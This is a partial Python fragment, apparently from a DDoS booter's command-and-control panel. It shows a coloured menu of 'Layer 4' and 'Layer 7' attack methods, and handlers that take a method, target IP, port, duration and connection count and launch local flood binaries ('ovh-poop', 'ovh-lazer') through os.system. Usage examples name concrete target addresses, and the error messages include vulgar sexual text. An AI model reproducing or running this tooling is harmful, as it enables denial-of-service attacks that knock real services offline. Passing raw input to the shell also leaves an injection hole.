...
def layer7():
    ...
    print(f'''
                                                 ...
                                                 \x1b[255;62;150m║   \x1b[255;62;150movh-poop            \x1b[173;67;28m║   \x1b[255;62;150movh-lazer         \x1b[255;62;150m║
                                                 \x1b[255;62;150m╚═══════════════════════╩═════════════════════╝
''')
...
# LAYER 4 METHODS   
            ...
            try:
                ...
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-poop {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: ovh-poop METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Africa gimme a spoofed please im down bad i can suck your dick')
                print('Example: ovh-poop GET 1.1.1.1 80 60 8500')
...
# LAYER 7 METHODS
        ...
        elif "ovh-lazer" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./ovh-lazer{method} {ip} {port} {time} 1024')
            except IndexError:
                print('Usage: ovh-lazer <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Africa gimme a spoofed please im down bad i can suck your dick')
                print('Example: ovh-lazer GET 51.38.92.223 80 60')
